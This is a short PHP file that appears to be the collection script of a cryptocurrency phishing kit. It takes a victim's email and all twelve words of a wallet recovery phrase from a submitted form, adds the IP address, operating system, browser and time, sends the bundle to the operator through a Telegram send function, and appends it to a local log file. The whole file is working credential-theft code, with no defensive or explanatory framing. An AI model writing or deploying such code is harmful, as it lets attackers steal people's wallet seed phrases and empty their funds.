<?php

require_once("config.php");
$message = '/-- WALLET --/' . getIPAddress() . "\r\n";
$message .= '[EMAIL] = ' . $_POST['email'] . "\r\n";
$message .= '[WORD 1] = ' . $_POST['word1'] . "\r\n";
$message .= '[WORD 2] = ' . $_POST['word2'] . "\r\n";
$message .= '[WORD 3] = ' . $_POST['word3'] . "\r\n";
$message .= '[WORD 4] = ' . $_POST['word4'] . "\r\n";
$message .= '[WORD 5] = ' . $_POST['word5'] . "\r\n";
$message .= '[WORD 6] = ' . $_POST['word6'] . "\r\n";
$message .= '[WORD 7] = ' . $_POST['word7'] . "\r\n";
$message .= '[WORD 8] = ' . $_POST['word8'] . "\r\n";
$message .= '[WORD 9] = ' . $_POST['word9'] . "\r\n";
$message .= '[WORD 10] = ' . $_POST['word10'] . "\r\n";
$message .= '[WORD 11] = ' . $_POST['word11'] . "\r\n";
$message .= '[WORD 12] = ' . $_POST['word12'] . "\r\n";
$message .= '[TIME/DATE] = ' . $date . "\r\n";
$message .= '[IP address] = ' . getIPAddress() . "\r\n";
$message .= '[OS] = ' . $user_os . "\r\n";
$message .= '[BROWSER] = ' . $user_browser . "\r\n";
telegram_send(urlencode($message));
$house = fopen('fucked/WALLET.html', 'a');
fwrite($house, $message);
fclose($house);

$data["success"] = true;

echo json_encode($data);

?>